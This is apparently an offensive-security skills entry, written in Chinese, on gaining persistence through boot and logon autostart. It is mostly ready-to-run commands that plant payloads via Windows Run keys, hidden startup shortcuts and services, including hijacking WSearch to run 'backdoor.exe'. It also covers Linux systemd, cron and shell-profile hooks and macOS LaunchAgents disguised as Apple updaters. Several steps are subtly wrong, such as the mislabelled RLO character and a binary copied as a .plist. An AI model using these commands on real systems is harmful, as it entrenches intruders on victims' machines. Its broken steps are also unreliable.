---
id: 07-002
title: "启动项与登录自动执行 (Boot/Logon Autostart)"
category: 持久化
category_en: Persistence
difficulty: ★★★
tools: "Regedit, Autoruns, schtasks, systemd, launchd"
last_updated: 2026-05
tags: ["persistence", "bootkit", "startup-autostart", "account-persistence"]
subdomain: persistence
nist_csf: ["PR.AC-01", "DE.CM-01"]
mitre_attack: ["T1543", "T1547", "T1136", "T1053"]
---
# 启动项与登录自动执行 (Boot/Logon Autostart)

## 概述

操作系统提供了多种机制允许程序在系统启动或用户登录时自动执行。攻击者利用这些合法功能实现持久化控制，包括注册表 Run 键、启动文件夹、系统服务、计划任务以及跨平台的启动脚本等。

## 核心技能

### 1. Windows 注册表 Run 键

```powershell
# 当前用户 Run 键 (无需管理员)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\Public\updater.exe"
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v Updater /t REG_SZ /d "C:\Users\Public\updater.exe"

# 本地机器 Run 键 (需管理员)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v SecurityScan /t REG_SZ /d "C:\Windows\Temp\security.exe"

# 使用 PowerShell
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\Users\Public\updater.exe"

# 隐藏手法 — 使用特殊字符伪装
# 利用 Unicode 控制字符 (RLO) 伪装文件名
# 例如: "svchost.exe" 伪装为 "svchost\xE2\x80\x8Eexe.txt"
```

### 2. 启动文件夹

```powershell
# 当前用户启动文件夹
$startup = [Environment]::GetFolderPath("Startup")
Copy-Item "C:\Temp\payload.exe" "$startup\WindowsUpdate.lnk"

# 所有用户启动文件夹 (需管理员)
Copy-Item "C:\Temp\payload.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\svchost.exe"

# 创建 LNK 快捷方式
$WScript = New-Object -ComObject "WScript.Shell"
$Shortcut = $WScript.CreateShortcut("$startup\SystemHelper.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-WindowStyle Hidden -Exec Bypass -File C:\Users\Public\script.ps1"
$Shortcut.IconLocation = "shell32.dll,1"
$Shortcut.WindowStyle = 7  # Hidden
$Shortcut.Save()
```

### 3. 系统服务自动启动

```powershell
# 创建自启动服务
sc create "SysHelper" binpath= "cmd.exe /c C:\Windows\Temp\helper.exe" start= auto
sc start "SysHelper"

# 修改现有服务映像路径
sc config "WSearch" binpath= "C:\Windows\Temp\backdoor.exe"
sc failure "WSearch" reset= 86400 actions= restart/1000/restart/1000

# PowerShell 方式
New-Service -Name "SysHelper" -BinaryPathName "C:\Windows\Temp\helper.exe" -StartupType Automatic
```

### 4. Linux 启动项

```bash
# systemd 服务持久化
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/update.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
systemctl start update.service

# init.d (SysV) 兼容
cp /usr/local/bin/payload /etc/init.d/networking-patch
update-rc.d networking-patch defaults

# .bashrc / .profile / .bash_profile
echo '[[ -f ~/.system_init ]] && source ~/.system_init' >> ~/.bashrc
echo '(nohup /usr/local/bin/.cache-update >/dev/null 2>&1 &)' >> ~/.profile

# crontab 持久化
(crontab -l 2>/dev/null; echo "*/10 * * * * /usr/local/bin/.cache-update") | crontab -
```

### 5. macOS 启动项

```bash
# LaunchAgent (用户级别)
cat > ~/Library/LaunchAgents/com.apple.softwareupdate.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/.systemupdate</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
launchctl load ~/Library/LaunchAgents/com.apple.softwareupdate.plist

# LaunchDaemon (系统级别，需 root)
sudo cp payload /Library/LaunchDaemons/com.apple.securityupdate.plist
sudo launchctl load /Library/LaunchDaemons/com.apple.securityupdate.plist
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Autoruns | 查看所有 Windows 自启动项 | https://learn.microsoft.com/sysinternals/downloads/autoruns |
| SharPersist | Windows 持久化工具集 | https://github.com/mandiant/SharPersist |
| PowerSploit Persistence | PowerShell 持久化模块 | https://github.com/PowerShellMafia/PowerSploit |
| Koadic | Windows 持久化框架 | https://github.com/zerosum0x0/koadic |
| systemd-analyze | Linux 启动项分析 | 系统内置 |

## 参考资源

- [MITRE ATT&CK — Boot or Logon Autostart Execution (T1547)](https://attack.mitre.org/techniques/T1547/)
- [MITRE ATT&CK — Scheduled Task/Job (T1053)](https://attack.mitre.org/techniques/T1053/)
- [HackTricks — Persistence](https://book.hacktricks.xyz/windows-hardening/stealth-persistence)
- [PayloadsAllTheThings — Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings)
